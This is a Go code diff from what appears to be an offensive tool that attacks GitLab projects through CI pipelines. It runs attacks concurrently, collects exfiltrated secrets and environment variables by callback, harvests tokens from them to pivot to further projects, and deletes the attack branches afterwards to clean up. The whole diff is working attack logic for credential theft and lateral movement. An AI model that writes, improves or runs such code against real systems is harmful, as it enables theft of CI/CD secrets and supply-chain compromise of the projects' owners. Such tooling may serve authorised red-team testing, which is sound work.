@@ -166,7 +166,19 @@ func (o *Orchestrator) processDepth(ctx context.Context, credQueue []*Credential
 }
 
 func (o *Orchestrator) attackAndHarvest(ctx context.Context, cl *gitlabx.Client, cred *Credential, targets []ExploitableTarget, pubPEM string, depth int, totalAttacked *int32) []*Credential {
-	var harvested []*Credential
+	// Phase 1: Launch attacks concurrently, bounded by AttackConcurrency.
+	type attackedTarget struct {
+		target      ExploitableTarget
+		pipelineURL string
+	}
+
+	var (
+		attacked []attackedTarget
+		mu       sync.Mutex
+		wg       sync.WaitGroup
+		sem      = make(chan struct{}, o.opts.AttackConcurrency)
+	)
+
 	for _, target := range targets {
 		if ctx.Err() != nil || int(atomic.LoadInt32(totalAttacked)) >= o.opts.MaxTargets {
 			break
@@ -176,30 +188,59 @@ func (o *Orchestrator) attackAndHarvest(ctx context.Context, cl *gitlabx.Client,
 		}
 		o.creds.MarkVisited(cred.TokenHash, target.ProjectID)
 
-		pipelineURL, err := o.attackTarget(ctx, cl, target, pubPEM)
-		if err != nil {
-			o.emit(PivotEvent{Type: "error", Depth: depth, Message: fmt.Sprintf("attack %s: %v", target.Path, err)})
-			continue
-		}
-		atomic.AddInt32(totalAttacked, 1)
-		o.emit(PivotEvent{Type: "attack", Depth: depth, Message: fmt.Sprintf("attacked %s -> %s", target.Path, pipelineURL)})
-
-		payload, err := o.callback.Receive(ctx, 5*time.Minute)
-		if err != nil {
-			o.emit(PivotEvent{Type: "error", Depth: depth, Message: fmt.Sprintf("receive from %s: %v", target.Path, err)})
-			continue
+		if o.opts.AttackDelay > 0 {
+			time.Sleep(o.opts.AttackDelay)
 		}
 
-		// Store all exfiltrated env vars
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(t ExploitableTarget) {
+			defer wg.Done()
+			defer func() { <-sem }()
+
+			pipelineURL, err := o.attackTarget(ctx, cl, t, pubPEM)
+			if err != nil {
+				o.emit(PivotEvent{Type: "error", Depth: depth, Message: fmt.Sprintf("attack %s: %v", t.Path, err)})
+				return
+			}
+			atomic.AddInt32(totalAttacked, 1)
+			o.emit(PivotEvent{Type: "attack", Depth: depth, Message: fmt.Sprintf("attacked %s -> %s", t.Path, pipelineURL)})
+
+			mu.Lock()
+			attacked = append(attacked, attackedTarget{target: t, pipelineURL: pipelineURL})
+			mu.Unlock()
+		}(target)
+	}
+	wg.Wait()
+
+	if len(attacked) == 0 {
+		return nil
+	}
+
+	// Phase 2: Batch-receive all callbacks with a single deadline.
+	payloads, _ := o.callback.ReceiveAll(ctx, o.opts.ReceiveTimeout, len(attacked))
+
+	// Process received payloads. Payloads carry no target correlation, so
+	// exfil data is attributed by arrival order (best-effort). Token
+	// extraction works regardless of source attribution.
+	var harvested []*Credential
+	for i, payload := range payloads {
+		target := attacked[0].target
+		if i < len(attacked) {
+			target = attacked[i].target
+		}
 		o.storeExfilData(payload.Secrets, target, depth)
-
 		harvested = append(harvested, o.harvestTokens(ctx, payload, target, depth)...)
+	}
 
-		if o.opts.Cleanup {
-			att := attack.NewAttacker(cl, o.gitlabURL, "", "", 30*time.Second)
-			_ = att.DeleteBranch(ctx, target.ProjectID, o.opts.AttackBranch)
+	// Phase 3: Cleanup attack branches if requested.
+	if o.opts.Cleanup {
+		att := attack.NewAttacker(cl, o.gitlabURL, "", "", 30*time.Second)
+		for _, at := range attacked {
+			_ = att.DeleteBranch(ctx, at.target.ProjectID, o.opts.AttackBranch)
 		}
 	}
+
 	return harvested
 }
 
